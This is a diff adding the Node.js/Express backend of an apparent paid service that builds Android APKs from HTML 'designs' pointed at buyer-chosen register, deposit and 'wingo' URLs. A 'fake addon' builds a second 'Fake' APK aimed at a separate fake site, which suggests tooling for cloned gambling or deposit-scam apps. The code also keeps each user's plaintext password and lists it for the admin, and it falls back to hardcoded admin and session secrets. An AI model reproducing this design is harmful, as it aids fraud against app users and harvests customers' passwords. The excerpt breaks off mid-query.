@@ -1,0 +1,815 @@
+require('dotenv').config();
+const { rateLimit } = require('express-rate-limit');
+const express = require('express');
+const session = require('express-session');
+const multer = require('multer');
+const path = require('path');
+const fs = require('fs');
+const bcrypt = require('bcryptjs');
+const { v4: uuidv4 } = require('uuid');
+
+const db = require('./database/db');
+const { buildApk, makePackageName } = require('./utils/apkbuilder');
+const { initBot, sendCoinRequest, sendApkReady } = require('./utils/telegram');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// ── Dirs ──
+['builds','uploads','templates/assets','base-apks','keystore'].forEach(d => {
+  fs.mkdirSync(path.join(__dirname, d), { recursive: true });
+});
+
+// ── Middleware ──
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use('/builds', express.static(path.join(__dirname, 'builds')));
+app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(session({
+  secret: process.env.SESSION_SECRET || 'zayro_secret',
+  resave: false,
+  saveUninitialized: false,
+  cookie: { maxAge: 7 * 24 * 60 * 60 * 1000 }
+}));
+
+// ── Multer configs ──
+const iconUpload    = multer({ dest: path.join(__dirname, 'uploads'), limits: { fileSize: 5   * 1024 * 1024 } });
+const adminUpload   = multer({ dest: path.join(__dirname, 'uploads'), limits: { fileSize: 50  * 1024 * 1024 } });
+const projectUpload = multer({ dest: path.join(__dirname, 'uploads'), limits: { fileSize: 200 * 1024 * 1024 } });
+
+// ── Init Telegram ──
+const tgSettings = db.prepare('SELECT value FROM settings WHERE key=?');
+const tgToken = tgSettings.get('telegram_bot_token')?.value || process.env.TELEGRAM_BOT_TOKEN;
+if (tgToken) initBot(tgToken, db);
+else initBot(null, db); // pass db even when no token so callbacks work once token added later
+
+// ── Auth middleware ──
+function requireAuth(req, res, next) {
+  if (req.session.userId !== undefined) return next();
+  res.status(401).json({ error: 'Login required' });
+}
+function requireAdmin(req, res, next) {
+  if (req.session.isAdmin) return next();
+  res.status(403).json({ error: 'Admin only' });
+}
+
+// ═══════════════════════════════════════════
+// AUTH ROUTES
+// ═══════════════════════════════════════════
+const getClientIp = (req) => req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
+const registerLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5, standardHeaders: true, legacyHeaders: false, handler: (req, res) => { const ip = getClientIp(req); db.prepare('INSERT OR IGNORE INTO blocked_ips(ip) VALUES(?)').run(ip); res.status(429).json({ error: 'Too many registration attempts. This IP has been blocked.' }); } });
+
+app.use('/api/register', (req, res, next) => { const ip = getClientIp(req); const blocked = db.prepare('SELECT 1 FROM blocked_ips WHERE ip=?').get(ip); if (blocked) return res.status(403).json({ error: 'Registration blocked from this IP.' }); next(); });
+app.post('/api/register', registerLimiter, async (req, res) => {
+  const { username, email, password } = req.body;
+  if (!username || !email || !password) return res.json({ error: 'All fields required' });
+  try {
+    const hash = await bcrypt.hash(password, 10);
+    const stmt = db.prepare('INSERT INTO users(username,email,password,plain_password) VALUES(?,?,?,?)');
+    const result = stmt.run(username.trim().toLowerCase(), email.trim().toLowerCase(), hash, password);
+    req.session.userId = result.lastInsertRowid;
+    req.session.username = username;
+    res.json({ success: true });
+  } catch (e) {
+    res.json({ error: 'Username or email already exists' });
+  }
+});
+
+app.post('/api/login', async (req, res) => {
+  const { username, password } = req.body;
+  if (!username || !password) return res.json({ error: 'Fields required' });
+
+  // Admin check
+  const adminUser = process.env.ADMIN_USERNAME || 'admin';
+  const adminPass = process.env.ADMIN_PASSWORD || 'admin123';
+  if (username === adminUser && password === adminPass) {
+    req.session.isAdmin = true;
+    req.session.userId = 0;
+    req.session.username = 'admin';
+    return res.json({ success: true, isAdmin: true });
+  }
+
+  const user = db.prepare('SELECT * FROM users WHERE username=? OR email=?').get(username.toLowerCase(), username.toLowerCase());
+  if (!user) return res.json({ error: 'User not found' });
+  const ok = await bcrypt.compare(password, user.password);
+  if (!ok) return res.json({ error: 'Wrong password' });
+  req.session.userId = user.id;
+  req.session.username = user.username;
+  res.json({ success: true, isAdmin: false });
+});
+
+app.post('/api/logout', (req, res) => {
+  req.session.destroy();
+  res.json({ success: true });
+});
+
+app.get('/api/me', requireAuth, (req, res) => {
+  if (req.session.isAdmin) return res.json({ isAdmin: true, username: 'admin' });
+  const user = db.prepare('SELECT id,username,email,coins,telegram_id FROM users WHERE id=?').get(req.session.userId);
+  res.json({ ...user, isAdmin: false });
+});
+
+app.post('/api/me/telegram', requireAuth, (req, res) => {
+  if (req.session.isAdmin) return res.json({ success: true });
+  const { telegram_id } = req.body;
+  if (!telegram_id) return res.json({ error: 'telegram_id required' });
+  db.prepare('UPDATE users SET telegram_id=? WHERE id=?').run(String(telegram_id), req.session.userId);
+  res.json({ success: true });
+});
+
+// ═══════════════════════════════════════════
+// DESIGN ROUTES
+// ═══════════════════════════════════════════
+
+app.get('/api/designs', (req, res) => {
+  const designs = db.prepare('SELECT id,name,description,price_coins,original_price_coins,fake_price_coins,type,java_type,preview_image,preview_video FROM designs WHERE active=1 ORDER BY id DESC').all();
+  res.json(designs);
+});
+
+app.get('/api/designs/:id', (req, res) => {
+  const d = db.prepare('SELECT * FROM designs WHERE id=? AND active=1').get(req.params.id);
+  if (!d) return res.status(404).json({ error: 'Not found' });
+  res.json(d);
+});
+
+// ═══════════════════════════════════════════
+// ORDER / BUILD ROUTES
+// ═══════════════════════════════════════════
+
+// Counter for package name uniqueness
+let _pkgCounter = db.prepare('SELECT MAX(id) as m FROM orders').get()?.m || 0;
+
+app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) => {
+  const { design_id, app_name, register_url, min_deposit, brand_title, fake_addon, fake_register_url } = req.body;
+  if (!design_id || !app_name || !register_url) return res.json({ error: 'Missing required fields' });
+
+  const design = db.prepare('SELECT * FROM designs WHERE id=? AND active=1').get(design_id);
+  if (!design) return res.json({ error: 'Design not found' });
+
+  const user = db.prepare('SELECT * FROM users WHERE id=?').get(req.session.userId);
+  if (!user) return res.status(401).json({ error: 'User not found. Please login again.' });
+
+  const fakeAddonEnabled = fake_addon === 'true' || fake_addon === true;
+  const fakePrice = design.fake_price_coins > 0 ? design.fake_price_coins : parseInt(db.prepare('SELECT value FROM settings WHERE key=?').get('addon_fake_price')?.value || '5');
+  const totalCoins = design.price_coins + (fakeAddonEnabled ? fakePrice : 0);
+
+  if (fakeAddonEnabled && !fake_register_url) return res.json({ error: 'Fake site register URL required' });
+  if (user.coins < totalCoins) return res.json({ error: `Not enough coins. Need ${totalCoins}, have ${user.coins}` });
+
+  const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
+  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(register_url);
+  const domain = extractDomain(register_url);
+  const firebasePath = `zayro${domain.replace(/[^a-z0-9]/gi, '').substring(0, 10)}`;
+
+  _pkgCounter++;
+  const packageName = makePackageName(app_name, _pkgCounter);
+  const iconFile = req.file ? path.basename(req.file.path) : null;
+
+  db.prepare('UPDATE users SET coins = coins - ? WHERE id=?').run(totalCoins, user.id);
+
+  const orderResult = db.prepare(`
+    INSERT INTO orders(user_id,design_id,app_name,package_name,register_url,deposit_url,wingo_url,domain,firebase_path,min_deposit,brand_title,icon_file,fake_register_url,status,coins_spent,design_variant)
+    VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,'building',?,?)
+  `).run(user.id, design_id, app_name.trim(), packageName, register_url.trim(), depositUrl, wingoUrl, domain, firebasePath, parseInt(min_deposit)||300, brand_title?.trim()||app_name.trim(), iconFile, fakeAddonEnabled ? fake_register_url.trim() : null, totalCoins, design.variant || 'real');
+
+  const orderId = orderResult.lastInsertRowid;
+  const buildId = `build_${orderId}_${Date.now()}`;
+
+  res.json({ success: true, orderId, buildId, message: 'Build started' });
+
+  // ── Build in background ──
+  const order = db.prepare('SELECT * FROM orders WHERE id=?').get(orderId);
+  const logs = [];
+  const logPush = (msg) => { logs.push(msg); db.prepare('UPDATE orders SET build_log=? WHERE id=?').run(logs.join('\n'), orderId); };
+
+  buildApk(order, design, buildId, logPush).then(async result => {
+    if (result.success) {
+      db.prepare('UPDATE orders SET apk_file=? WHERE id=?').run(result.apkFile, orderId);
+
+      let fakeResult = null;
+      // ── Fake APK build if addon enabled ──
+      if (fakeAddonEnabled && fake_register_url) {
+        logPush('\n--- Building Fake APK ---');
+        const fakeOrder = {
+          ...order,
+          is_fake: true,
+          app_name: order.app_name + ' Fake',
+          package_name: 'com.zayrof.' + packageName.split('.').pop(),
+          register_url: fake_register_url.trim(),
+          deposit_url: buildUrls(fake_register_url.trim()).deposit,
+          wingo_url: buildUrls(fake_register_url.trim()).wingo,
+          domain: extractDomain(fake_register_url.trim()),
+          firebase_path: `zayrof${extractDomain(fake_register_url.trim()).replace(/[^a-z0-9]/gi,'').substring(0,8)}`
+        };
+        const fakeBuildId = buildId + '_fake';
+        fakeResult = await buildApk(fakeOrder, design, fakeBuildId, logPush);
+        if (fakeResult.success) {
+          db.prepare('UPDATE orders SET fake_apk_file=? WHERE id=?').run(fakeResult.apkFile, orderId);
+          logPush('Fake APK ready!');
+        } else {
+          logPush('Fake APK build failed: ' + fakeResult.error);
+        }
+      }
+
+      db.prepare('UPDATE orders SET status=? WHERE id=?').run('done', orderId);
+      // Send APK files via Telegram (instant)
+      const apkPaths = [result.apkPath];
+      if (fakeResult?.success) apkPaths.push(fakeResult.apkPath);
+      sendApkReady(user, db.prepare('SELECT * FROM orders WHERE id=?').get(orderId), apkPaths, []).catch(() => {});
+    } else {
+      db.prepare('UPDATE orders SET status=? WHERE id=?').run('failed', orderId);
+      db.prepare('UPDATE users SET coins = coins + ? WHERE id=?').run(totalCoins, user.id);
+    }
+  }).catch(err => {
+    db.prepare('UPDATE orders SET status=?,build_log=? WHERE id=?').run('failed', err.message, orderId);
+    db.prepare('UPDATE users SET coins = coins + ? WHERE id=?').run(totalCoins, user.id);
+  });
+});
+
+app.get('/api/orders', requireAuth, (req, res) => {
+  const orders = db.prepare(`
+    SELECT o.id,o.app_name,o.package_name,o.status,o.apk_file,o.fake_apk_file,o.coins_spent,o.created_at,d.name as design_name
+    FROM orders o JOIN designs d ON o.design_id=d.id
+    WHERE o.user_id=? ORDER BY o.id DESC
+  `).all(req.session.userId);
+  res.json(orders);
+});
+
+app.get('/api/orders/:id/status', requireAuth, (req, res) => {
+  const o = db.prepare('SELECT id,status,apk_file,fake_apk_file,build_log FROM orders WHERE id=? AND user_id=?').get(req.params.id, req.session.userId);
+  if (!o) return res.status(404).json({ error: 'Not found' });
+  res.json(o);
+});
+
+app.get('/api/orders/:id/download', requireAuth, (req, res) => {
+  const o = db.prepare('SELECT * FROM orders WHERE id=? AND user_id=?').get(req.params.id, req.session.userId);
+  if (!o || o.status !== 'done' || !o.apk_file) return res.status(404).json({ error: 'APK not ready' });
+  const buildsDir = path.join(__dirname, 'builds');
+  let apkPath = null;
+  for (const dir of fs.readdirSync(buildsDir)) {
+    const p = path.join(buildsDir, dir, o.apk_file);
+    if (fs.existsSync(p)) { apkPath = p; break; }
+  }
+  if (!apkPath) return res.status(404).json({ error: 'File not found' });
+  res.download(apkPath, o.apk_file);
+});
+
+app.get('/api/orders/:id/download-fake', requireAuth, (req, res) => {
+  const o = db.prepare('SELECT * FROM orders WHERE id=? AND user_id=?').get(req.params.id, req.session.userId);
+  if (!o || o.status !== 'done' || !o.fake_apk_file) return res.status(404).json({ error: 'Fake APK not ready' });
+  const buildsDir = path.join(__dirname, 'builds');
+  let apkPath = null;
+  for (const dir of fs.readdirSync(buildsDir)) {
+    const p = path.join(buildsDir, dir, o.fake_apk_file);
+    if (fs.existsSync(p)) { apkPath = p; break; }
+  }
+  if (!apkPath) return res.status(404).json({ error: 'File not found' });
+  res.download(apkPath, o.fake_apk_file);
+});
+
+// Domain change
+app.post('/api/orders/:id/change-domain', requireAuth, async (req, res) => {
+  const { new_register_url } = req.body;
+  if (!new_register_url) return res.json({ error: 'New URL required' });
+
+  const order = db.prepare('SELECT * FROM orders WHERE id=? AND user_id=?').get(req.params.id, req.session.userId);
+  if (!order) return res.status(404).json({ error: 'Order not found' });
+  if (order.status !== 'done') return res.json({ error: 'Order must be completed first' });
+
+  const price = parseInt(db.prepare('SELECT value FROM settings WHERE key=?').get('domain_change_price')?.value || '10');
+  const user = db.prepare('SELECT * FROM users WHERE id=?').get(req.session.userId);
+  if (!user) return res.json({ error: 'User not found' });
+  if (user.coins < price) return res.json({ error: `Not enough coins. Need ${price}, have ${user.coins}` });
+
+  const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
+  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(new_register_url.trim());
+  const domain = extractDomain(new_register_url.trim());
+  const firebasePath = `zayro${domain.replace(/[^a-z0-9]/gi,'').substring(0,10)}`;
+
+  db.prepare('UPDATE users SET coins = coins - ? WHERE id=?').run(price, user.id);
+  db.prepare('UPDATE orders SET register_url=?,deposit_url=?,wingo_url=?,domain=?,firebase_path=?,status=?,apk_file=NULL,build_log=?,domain_change_count=domain_change_count+1 WHERE id=?')
+    .run(new_register_url.trim(), depositUrl, wingoUrl, domain, firebasePath, 'building', 'Domain change initiated...', order.id);
+
+  const buildId = `build_${order.id}_dc_${Date.now()}`;
+  const updatedOrder = db.prepare('SELECT * FROM orders WHERE id=?').get(order.id);
+  const design = db.prepare('SELECT * FROM designs WHERE id=?').get(order.design_id);
+
+  res.json({ success: true, orderId: order.id, buildId });
+
+  const logs = ['Domain change initiated...'];
+  const logPush = (msg) => { logs.push(msg); db.prepare('UPDATE orders SET build_log=? WHERE id=?').run(logs.join('\n'), order.id); };
+  buildApk(updatedOrder, design, buildId, logPush).then(async result => {
+    if (result.success) {
+      db.prepare('UPDATE orders SET apk_file=?,status=? WHERE id=?').run(result.apkFile, 'done', order.id);
+      // Send APK file via Telegram (instant)
+      sendApkReady(user, db.prepare('SELECT * FROM orders WHERE id=?').get(order.id), [result.apkPath], []).catch(() => {});
+    } else {
+      db.prepare('UPDATE orders SET status=? WHERE id=?').run('failed', order.id);
+      db.prepare('UPDATE users SET coins = coins + ? WHERE id=?').run(price, user.id);
+    }
+  }).catch(err => {
+    db.prepare('UPDATE orders SET status=?,build_log=? WHERE id=?').run('failed', err.message, order.id);
+    db.prepare('UPDATE users SET coins = coins + ? WHERE id=?').run(price, user.id);
+  });
+});
+
+// ═══════════════════════════════════════════
+// COIN ROUTES
+// ═══════════════════════════════════════════
+
+app.get('/api/settings/payment', (req, res) => {
+  const s = db.prepare('SELECT key,value FROM settings WHERE key IN (?,?,?,?,?)').all('upi_qr_image','upi_id','coin_rate','addon_fake_price','domain_change_price');
+  const result = {};
+  s.forEach(r => result[r.key] = r.value);
+  res.json(result);
+});
+
+app.post('/api/coins/request', requireAuth, iconUpload.single('screenshot'), async (req, res) => {
+  if (req.session.isAdmin) return res.json({ error: 'Admin cannot submit coin requests' });
+  const { coins, utr } = req.body;
+  if (!coins || !utr) return res.json({ error: 'Coins and UTR required' });
+
+  const rate   = parseFloat(db.prepare('SELECT value FROM settings WHERE key=?').get('coin_rate')?.value || '1');
+  const amount = parseFloat(coins) * rate;
+
+  const user = db.prepare('SELECT * FROM users WHERE id=?').get(req.session.userId);
+  if (!user) return res.json({ error: 'User not found' });
+
+  const screenshotFile = req.file ? path.basename(req.file.path) : '';
+  const result = db.prepare(
+    'INSERT INTO coin_requests(user_id,coins_requested,amount_paid,utr,screenshot_file) VALUES(?,?,?,?,?)'
+  ).run(user.id, parseInt(coins), amount, utr.trim(), screenshotFile);
+
+  const requestRow = db.prepare('SELECT * FROM coin_requests WHERE id=?').get(result.lastInsertRowid);
+  const adminId    = db.prepare('SELECT value FROM settings WHERE key=?').get('telegram_admin_id')?.value
+                     || process.env.TELEGRAM_ADMIN_CHAT_ID;
+  const screenshotPath = screenshotFile ? path.join(__dirname, 'uploads', screenshotFile) : null;
+  try {
+    const msgId = await sendCoinRequest(adminId, user, requestRow, screenshotPath);
+    if (msgId) db.prepare('UPDATE coin_requests SET telegram_msg_id=? WHERE id=?').run(msgId, requestRow.id);
+  } catch(e) { /* Telegram not configured */ }
+
+  res.json({ success: true, message: 'Request sent. Admin will approve soon.' });
+});
+
+// ═══════════════════════════════════════════
+// ADMIN ROUTES
+// ═══════════════════════════════════════════
+
+// Designs CRUD
+app.get('/api/admin/designs', requireAdmin, (req, res) => {
+  res.json(db.prepare('SELECT * FROM designs ORDER BY id DESC').all());
+});
+
+app.post('/api/admin/designs', requireAdmin, adminUpload.fields([
+  { name: 'preview_image', maxCount: 1 },
+  { name: 'preview_video', maxCount: 1 },
+  { name: 'popup_html', maxCount: 1 },
+  { name: 'fake_popup_html', maxCount: 1 }
+]), async (req, res) => {
+  const { name, description, price_coins, type, java_type, category, variant } = req.body;
+  if (!name || !price_coins) return res.json({ error: 'Name and price required' });
+  const original_price_coins = parseInt(req.body.original_price_coins || 0);
+  const fake_price_coins = parseInt(req.body.fake_price_coins || 5);
+
+  const templatesDir = path.join(__dirname, 'templates');
+  let popupHtmlFile = req.body.popup_html_file || '';
+  let fakePopupHtmlFile = '';
+
+  if (req.files?.popup_html?.[0]) {
+    const f = req.files.popup_html[0];
+    const uniqueName = `${Date.now()}_${f.originalname.replace(/[^a-zA-Z0-9._-]/g, '_')}`;
+    const dest = path.join(templatesDir, uniqueName);
+    fs.renameSync(f.path, dest);
+    popupHtmlFile = uniqueName;
+  }
+
+  if (req.files?.fake_popup_html?.[0]) {
+    const f = req.files.fake_popup_html[0];
+    const uniqueName = `fake_${Date.now()}_${f.originalname.replace(/[^a-zA-Z0-9._-]/g, '_')}`;
+    const dest = path.join(templatesDir, uniqueName);
+    fs.renameSync(f.path, dest);
+    fakePopupHtmlFile = uniqueName;
+  }
+
+  let previewImage = '', previewVideo = '';
+  if (req.files?.preview_image?.[0]) previewImage = path.basename(req.files.preview_image[0].path);
+  if (req.files?.preview_video?.[0]) previewVideo = path.basename(req.files.preview_video[0].path);
+
+  if (!popupHtmlFile) return res.json({ error: 'Popup HTML file required' });
+
+  db.prepare(`INSERT INTO designs(name,description,price_coins,original_price_coins,fake_price_coins,type,java_type,category,variant,popup_html_file,fake_popup_html_file,preview_image,preview_video)
+    VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(name, description||'', parseInt(price_coins), original_price_coins, fake_price_coins, type||'normal', java_type||'normal', category||'normal', variant||'real', popupHtmlFile, fakePopupHtmlFile, previewImage, previewVideo);
+
+  res.json({ success: true });
+});
+
+app.patch('/api/admin/designs/:id', requireAdmin, adminUpload.fields([
+  { name: 'preview_image',    maxCount: 1 },
+  { name: 'preview_video',    maxCount: 1 },
+  { name: 'popup_html',       maxCount: 1 },
+  { name: 'fake_popup_html',  maxCount: 1 }
+]), (req, res) => {
+  const templatesDir = path.join(__dirname, 'templates');
+  const uploadsDir = path.join(__dirname, 'uploads');
+  const { name, description, price_coins, original_price_coins, fake_price_coins, active, type, java_type, category, variant } = req.body;
+
+  // Get current design to know old file names
+  const currentDesign = db.prepare('SELECT * FROM designs WHERE id=?').get(req.params.id);
+  if (!currentDesign) return res.status(404).json({ error: 'Design not found' });
+
+  const fields = [];
+  const vals   = [];
+
+  if (name             !== undefined) { fields.push('name=?');                   vals.push(name); }
+  if (description      !== undefined) { fields.push('description=?');            vals.push(description); }
+  if (price_coins      !== undefined) { fields.push('price_coins=?');            vals.push(parseInt(price_coins) || 0); }
+  if (original_price_coins !== undefined) { fields.push('original_price_coins=?'); vals.push(parseInt(original_price_coins) || 0); }
+  if (fake_price_coins !== undefined) { fields.push('fake_price_coins=?');       vals.push(parseInt(fake_price_coins) || 5); }
+  if (active           !== undefined) { fields.push('active=?');                 vals.push(active === '1' || active === 1 || active === true ? 1 : 0); }
+  if (type             !== undefined) { fields.push('type=?');                   vals.push(type); }
+  if (java_type        !== undefined) { fields.push('java_type=?');              vals.push(java_type); }
+  if (category         !== undefined) { fields.push('category=?');               vals.push(category); }
+  if (variant          !== undefined) { fields.push('variant=?');                vals.push(variant); }
+
+  // Track old files to delete after successful update
+  const oldFilesToDelete = [];
+
+  // handle file uploads — keep old file if no new one uploaded
+  if (req.files?.popup_html?.[0]) {
+    const f = req.files.popup_html[0];
+    const uniqueName = `${Date.now()}_${f.originalname.replace(/[^a-zA-Z0-9._-]/g, '_')}`;
+    fs.renameSync(f.path, path.join(templatesDir, uniqueName));
+    fields.push('popup_html_file=?'); vals.push(uniqueName);
+    // Mark old file for deletion
+    if (currentDesign.popup_html_file) {
+      oldFilesToDelete.push(path.join(templatesDir, currentDesign.popup_html_file));
+    }
+  }
+  if (req.files?.fake_popup_html?.[0]) {
+    const f = req.files.fake_popup_html[0];
+    const uniqueName = `fake_${Date.now()}_${f.originalname.replace(/[^a-zA-Z0-9._-]/g, '_')}`;
+    fs.renameSync(f.path, path.join(templatesDir, uniqueName));
+    fields.push('fake_popup_html_file=?'); vals.push(uniqueName);
+    if (currentDesign.fake_popup_html_file) {
+      oldFilesToDelete.push(path.join(templatesDir, currentDesign.fake_popup_html_file));
+    }
+  }
+  if (req.files?.preview_image?.[0]) {
+    fields.push('preview_image=?');
+    const newFileName = path.basename(req.files.preview_image[0].path);
+    vals.push(newFileName);
+    if (currentDesign.preview_image) {
+      oldFilesToDelete.push(path.join(uploadsDir, currentDesign.preview_image));
+    }
+  }
+  if (req.files?.preview_video?.[0]) {
+    fields.push('preview_video=?');
+    const newFileName = path.basename(req.files.preview_video[0].path);
+    vals.push(newFileName);
+    if (currentDesign.preview_video) {
+      oldFilesToDelete.push(path.join(uploadsDir, currentDesign.preview_video));
+    }
+  }
+
+  if (!fields.length) return res.json({ error: 'Nothing to update' });
+  vals.push(req.params.id);
+  db.prepare(`UPDATE designs SET ${fields.join(',')} WHERE id=?`).run(...vals);
+
+  // Delete old files after successful database update
+  for (const filePath of oldFilesToDelete) {
+    try {
+      if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+    } catch (e) {
+      console.error('Failed to delete old file:', filePath, e);
+    }
+  }
+
+  res.json({ success: true });
+});
+
+app.delete('/api/admin/designs/:id', requireAdmin, (req, res) => {
+  try {
+    db.prepare('DELETE FROM orders WHERE design_id=?').run(req.params.id);
+    db.prepare('DELETE FROM designs WHERE id=?').run(req.params.id);
+    res.json({ success: true });
+  } catch(e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// Users
+app.get('/api/admin/users', requireAdmin, (req, res) => {
+  res.json(db.prepare('SELECT id,username,email,coins,plain_password,created_at FROM users ORDER BY id DESC').all());
+});
+
+app.post('/api/admin/users/:id/coins', requireAdmin, (req, res) => {
+  const { amount, action } = req.body;
+  if (!amount || !action) return res.json({ error: 'Amount and action required' });
+  if (action === 'add') db.prepare('UPDATE users SET coins = coins + ? WHERE id=?').run(parseInt(amount), req.params.id);
+  else if (action === 'set') db.prepare('UPDATE users SET coins=? WHERE id=?').run(parseInt(amount), req.params.id);
+  else if (action === 'subtract') db.prepare('UPDATE users SET coins = MAX(0, coins - ?) WHERE id=?').run(parseInt(amount), req.params.id);
+  res.json({ success: true });
+});
+
+app.delete('/api/admin/users/:id', requireAdmin, (req, res) => {
+  const id = req.params.id;
+  db.prepare('DELETE FROM coin_requests WHERE user_id=?').run(id);
+  db.prepare('DELETE FROM orders WHERE user_id=?').run(id);
+  const info = db.prepare('DELETE FROM users WHERE id=?').run(id);
+  if (!info.changes) return res.json({ error: 'User not found' });
+  res.json({ success: true });
+});
+
+// Coin requests
+app.get('/api/admin/coin-requests', requireAdmin, (req, res) => {
+  const rows = db.prepare(`
+    SELECT cr.*,u.username,u.email FROM coin_requests cr
+    JOIN users u ON cr.user_id=u.id
+    ORDER BY cr.id DESC
+  `).all();
+  res.json(rows);
+});
+
+app.post('/api/admin/coin-requests/:id/approve', requireAdmin, (req, res) => {
+  const row = db.prepare('SELECT * FROM coin_requests WHERE id=?').get(req.params.id);
+  if (!row) return res.json({ error: 'Not found' });
+  if (row.status !== 'pending') return res.json({ error: 'Already processed' });
+  db.prepare('UPDATE coin_requests SET status=?,approved_by=? WHERE id=?').run('approved', 'admin', row.id);
+  db.prepare('UPDATE users SET coins = coins + ? WHERE id=?').run(row.coins_requested, row.user_id);
+  res.json({ success: true });
+});
+
+app.post('/api/admin/coin-requests/:id/reject', requireAdmin, (req, res) => {
+  db.prepare('UPDATE coin_requests SET status=?,approved_by=? WHERE id=?').run('rejected', 'admin', req.params.id);
+  res.json({ success: true });
+});
+
+// All orders with filters, search, pagination
+app.get('/api/admin/orders', requireAdmin, (req, res) => {
+  const {
+    status,           // all, completed, failed, pending, building
+    search,           // search by order ID, username, user ID, design name
+    sort = 'desc',    // desc (newest first), asc (oldest first)
+    page = 1,
+    limit = 20
+  } = req.query;
+
+  let where = 'WHERE 1=1';
+  const params = [];
+
+  if (status && status !== 'all') {
+    if (status === 'completed') {
+      where += ' AND o.status = ?';
+      params.push('done');
+    } else if (status === 'failed') {
+      where += ' AND o.status = ?';
+      params.push('failed');
+    } else if (status === 'pending') {
+      where += ' AND o.status = ?';
+      params.push('pending');
+    } else if (status === 'building') {
+      where += ' AND o.status = ?';
+      params.push('building');
+    }
+  }
+
+  if (search) {
+    where += ` AND (o.id LIKE ? OR u.username LIKE ? OR u.id LIKE ? OR d.name LIKE ?)`;
+    const searchTerm = `%${search}%`;
+    params.push(searchTerm, searchTerm, searchTerm, searchTerm);
+  }
+
+  const orderBy = sort === 'asc' ? 'ASC' : 'DESC';
+  const offset = (parseInt(page) - 1) * parseInt(limit);
+
+  // Get total count
+  const totalCount = db.prepare(`
+    SELECT COUNT(*) as count FROM orders o
+    JOIN users u ON o.user_id=u.id
+    JOIN designs d ON o.design_id=d.id
+    ${where}
+  `).get(...params).count;
+
+  // Get orders
+  const rows = db.prepare(`
+    SELECT o.*,u.username,d.name as design_name,d.category,d.variant FROM orders o
+    JOIN users u ON o.user_id=u.id
+    JOIN designs d ON o.design_id=d.id
+    ${where}
+    ORDER BY o.id ${orderBy}
+    LIMIT ? OFFSET ?
+  `).all(...params, parseInt(limit), offset);
+
+  res.json({
+    orders: rows,
+    pagination: {
+      total: totalCount,
+      page: parseInt(page),
+      limit: parseInt(limit),
+      totalPages: Math.ceil(totalCount / parseInt(limit))
+    }
+  });
+});
+
+// Delete single order
+app.delete('/api/admin/orders/:id', requireAdmin, (req, res) => {
+  try {
+    const order = db.prepare('SELECT * FROM orders WHERE id=?').get(req.params.id);
+    if (!order) return res.status(404).json({ error: 'Order not found' });
+
+    // Delete APK files if exist
+    const buildsDir = path.join(__dirname, 'builds');
+    if (order.apk_file || order.fake_apk_file) {
+      for (const dir of fs.readdirSync(buildsDir)) {
+        const dirPath = path.join(buildsDir, dir);
+        if (order.apk_file) {
+          const apkPath = path.join(dirPath, order.apk_file);
+          if (fs.existsSync(apkPath)) fs.unlinkSync(apkPath);
+        }
+        if (order.fake_apk_file) {
+          const fakeApkPath = path.join(dirPath, order.fake_apk_file);
+          if (fs.existsSync(fakeApkPath)) fs.unlinkSync(fakeApkPath);
+        }
+      }
+    }
+
+    // Delete order
+    db.prepare('DELETE FROM orders WHERE id=?').run(req.params.id);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// Bulk delete orders
+app.delete('/api/admin/orders', requireAdmin, (req, res) => {
+  const { ids } = req.body; // array of order IDs
+  if (!Array.isArray(ids) || !ids.length) return res.json({ error: 'No IDs provided' });
+
+  try {
+    // Delete APK files for each order
+    const buildsDir = path.join(__dirname, 'builds');
+    for (const id of ids) {
+      const order = db.prepare('SELECT * FROM orders WHERE id=?').get(id);
+      if (order && (order.apk_file || order.fake_apk_file)) {
+        for (const dir of fs.readdirSync(buildsDir)) {
+          const dirPath = path.join(buildsDir, dir);
+          if (order.apk_file) {
+            const apkPath = path.join(dirPath, order.apk_file);
+            if (fs.existsSync(apkPath)) fs.unlinkSync(apkPath);
+          }
+          if (order.fake_apk_file) {
+            const fakeApkPath = path.join(dirPath, order.fake_apk_file);
+            if (fs.existsSync(fakeApkPath)) fs.unlinkSync(fakeApkPath);
+          }
+        }
+      }
+    }
+
+    // Delete orders
+    const placeholders = ids.map(() => '?').join(',');
+    db.prepare(`DELETE FROM orders WHERE id IN (${placeholders})`).run(...ids);
+    res.json({ success: true, deleted: ids.length });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// User-wise orders
+app.get('/api/admin/users/:id/orders', requireAdmin, (req, res) => {
+  const userId = req.params.id;
+  const user = db.prepare('SELECT id,username,email,coins,plain_password,created_at FROM users WHERE id=?').get(userId);
+  if (!user) return res.status(404).json({ error: 'User not found' });
+
+  const orders = db.prepare(`
+    SELECT o.*,d.name as design_name,d.category,d.variant FROM orders o
+    JOIN designs d ON o.design_id=d.id
+    WHERE o.user_id=? ORDER BY o.id DESC
+  `).all(userId);
+
+  const stats = {
+    total: orders.length,
+    completed: orders.filter(o => o.status === 'done').length,
+    failed: orders.filter(o => o.status === 'failed').length,
+    pending: orders.filter(o => o.status === 'pending').length,
+    building: orders.filter(o => o.status === 'building').length
+  };
+
+  res.json({ user, orders, stats });
+});
+
+// Get all users with order counts
+app.get('/api/admin/users/stats', requireAdmin, (req, res) => {
+  const users = db.prepare(`
+    SELECT u.id,u.username,u.email,u.coins,u.created_at,
+      COUNT(o.id) as total_orders,
+      SUM(CASE WHEN o.status='done' THEN 1 ELSE 0 END) as completed,
+      SUM(CASE WHEN o.status='failed' THEN 1 ELSE 0 END) as failed,
+      SUM(CASE WHEN o.status='pending' THEN 1 ELSE 0 END) as pending,
+      SUM(CASE WHEN o.status='building' THEN 1 ELSE 0 END) as building
+    FROM users u
+    LEFT JOIN orders o ON u.id=o.user_id
+    GROUP BY u.id
